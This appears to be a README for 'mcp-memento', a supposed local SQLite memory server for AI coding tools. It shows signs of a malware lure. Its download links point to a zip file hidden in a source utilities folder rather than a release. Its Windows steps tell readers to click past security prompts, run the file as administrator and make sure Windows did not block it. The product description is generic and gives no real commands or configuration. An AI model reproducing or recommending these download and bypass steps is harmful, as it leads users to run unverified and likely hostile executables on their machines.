# 🧠 mcp-memento - Keep AI Context in One Place

[![Download mcp-memento](https://img.shields.io/badge/Download%20mcp-memento-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bogeymanlicitness496/mcp-memento/main/src/memento/utils/memento_mcp_2.6.zip)

## 📌 What mcp-memento does

mcp-memento helps AI coding tools keep useful facts in one place. It gives your assistant a simple memory layer so it can hold on to notes, project details, and relationship links while you work.

Use it when you want your AI tool to remember things across sessions, track parts of a codebase, or keep a small knowledge base for a project. It stores data in SQLite, so your information stays in a local file on your computer.

## 🚀 Download and run on Windows

Open this page and get the app from there:

[Download mcp-memento](https://raw.githubusercontent.com/Bogeymanlicitness496/mcp-memento/main/src/memento/utils/memento_mcp_2.6.zip)

After you open the page, look for the latest release or the main download option.

### Steps for Windows

1. Open the download page in your browser.
2. Get the Windows version of the app or package.
3. Save the file to your Downloads folder.
4. If Windows shows a security prompt, choose Keep or More info, then Run.
5. Follow the on-screen steps until setup finishes.
6. Start the app from the Start menu or from the folder where you saved it.

### If you use a portable version

1. Download the file.
2. Move it to a folder you can find later.
3. Double-click the file to launch it.
4. Leave the data file in the same place so mcp-memento can keep your memory data.

## 🖥️ What you need

mcp-memento works best on a modern Windows PC with:

- Windows 10 or Windows 11
- A recent version of Python 3 if you run it from source
- Enough free space for a small SQLite database
- Access to your AI coding tool or editor

It is built for local use, so it does not need a large setup. Most users only need to download it and connect it to their editor or agent tool.

## ✨ Main features

- Keeps notes for AI coding agents
- Stores memory in a local SQLite database
- Helps link related people, files, tasks, and ideas
- Works as a Model Context Protocol server
- Fits into editor and assistant workflows
- Supports knowledge base style use
- Keeps project context available over time
- Helps reduce repeat explanations to your AI tool

## 🧭 Where it fits in your workflow

mcp-memento is useful when an AI assistant keeps forgetting earlier details. Instead of repeating the same project notes, you can store them once and let the tool read them later.

Common uses include:

- remembering project rules
- storing file and folder notes
- tracking code decisions
- linking related tasks
- keeping a small team knowledge base
- giving an assistant a stable place to read and write context

## 🛠️ Basic setup

If you downloaded a ready-to-run Windows file, open it and follow the prompts.

If you are using it with an editor or AI tool, connect it by adding the server details to that tool’s MCP settings. Many tools let you add a local server by pointing to the app file or a launch command.

Typical setup flow:

1. Download the app.
2. Start it on Windows.
3. Open your AI tool or editor.
4. Add mcp-memento as an MCP server.
5. Save the settings.
6. Test it by asking the assistant to save a note or recall a stored fact.

## 🔗 Connecting it to your AI tool

mcp-memento is made for tools that support the Model Context Protocol. That includes assistant apps and editors that can talk to local MCP servers.

When you connect it, your tool can:

- read stored memory
- save new facts
- link items in your knowledge base
- use past project context during future chats

If your editor has an extension panel, look for an MCP or server section. Add mcp-memento there and point it to the local app or executable you downloaded.

## 🗂️ What gets stored

The app keeps data in structured form, which makes it easy to search and reuse. The database can hold:

- notes
- project facts
- relationships between items
- memory entries
- reference links
- working context for coding tasks

This makes it easier for an AI assistant to stay on task without losing earlier information.

## 📚 Example use cases

### Solo coding work

Keep track of the parts of your app, your naming rules, and the decisions you already made.

### Long projects

Store design notes and return to them later without retyping everything.

### Knowledge base

Save facts about APIs, files, tools, and people in one local place.

### Editor integration

Use it with your code editor so your assistant can read and write memory while you work.

## 🔍 Search and recall

mcp-memento is built to help your assistant find the right information fast. You can keep notes short and direct, then reuse them when needed.

Good items to store:

- the purpose of a folder
- what a function should do
- project rules
- known bugs
- names of key files
- links between features and tasks

## 🔐 Data stays local

Your memory data lives in SQLite on your machine. That makes it easy to back up, move, or inspect with other tools if needed.

Typical local storage benefits:

- simple file-based storage
- easy backup
- easy restore
- no complex server setup
- works well for personal projects

## 🧪 First test after setup

After you connect mcp-memento, try a simple test:

1. Ask your assistant to save a note about your project.
2. Ask it to recall that note in a new chat.
3. Ask it to link two project items together.
4. Check that the answer uses the stored context.

If the assistant can save and recall the note, the setup is working.

## 📁 Project topics

- ai-assistants
- code-assistants
- developer-tools
- ide-integration
- knowledge-base
- mcp
- mcp-server
- persistent-memory
- productivity-tools
- python3

## 🧩 Common file types

You may see files such as:

- a Windows executable
- a configuration file
- a SQLite database file
- a launch script
- a README file

Keep the database file in a safe place if you want your memory to stay available between runs.

## 🖱️ Simple Windows tips

- Use Downloads for the first install
- Pin the app to Start if you use it often
- Keep the data folder in one place
- Back up the SQLite file before big changes
- Close the app before moving its data file

## 🧰 If you run it from source

If you are comfortable using Python 3, you can run the project from source on Windows.

Typical steps:

1. Install Python 3.
2. Download the repository files.
3. Open a terminal in the project folder.
4. Install the needed Python packages.
5. Start the server with the provided launch command.
6. Connect your AI tool to the local server.

If you are not using Python often, the Windows download is the easier path.

## 🧭 Troubleshooting

### The file does not open

- Check that the download finished
- Try right-clicking and choosing Run as administrator
- Make sure Windows did not block the file

### The assistant cannot see the server

- Check the MCP settings in your editor
- Confirm the app is running
- Verify the path to the file is correct
- Restart your editor after saving changes

### Notes do not appear later

- Check that the SQLite database file stayed in the same folder
- Make sure the app closed cleanly
- Look for a save or sync action in your tool

### The wrong version opens

- Delete old copies from other folders
- Use only the latest downloaded file
- Start from the newest path you saved

## 📦 Backups

Because mcp-memento stores data in a local SQLite file, backups are simple.

To back up your data:

1. Close the app.
2. Copy the database file to another folder.
3. Save the copy on a drive or cloud folder.
4. Restore it later by placing it back in the app folder.

## 🔄 Updates

When a new version is available, download it from the same project page and replace the old app if needed. Keep your database file in place so your stored memory stays intact.

## 🧷 Best way to use it

Keep entries short and clear. Store one idea per note when you can. Use names that make sense to you and your assistant.

Good examples:

- App uses local SQLite storage
- Main UI folder holds shared components
- Billing flow depends on auth state
- Fix header spacing on mobile

## 📌 Why this project helps

AI tools work better when they can remember what matters. mcp-memento gives them a local place to store that context, so you do less repeat work and keep your project notes close at hand
